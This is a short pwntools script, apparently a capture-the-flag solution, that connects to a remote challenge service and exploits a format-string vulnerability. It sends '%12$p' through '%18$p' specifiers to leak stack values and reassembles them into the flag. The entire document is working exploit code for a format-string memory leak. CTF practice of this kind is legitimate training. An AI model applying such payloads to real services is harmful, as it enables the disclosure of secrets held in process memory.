from pwn import *

ip = "140.110.112.77"
port = 6127

r = remote(ip, port)
# r = process("./fmtstr")

payload = ""

for i in range(12, 19):
    payload += "%{}$p.".format(i)

r.sendline(payload)
out = r.recv()
flag = b""

for i in out.split(b"."):
    try:
        flag += p64(int(i, 16))
    except:
        continue

print(flag)

r.interactive()
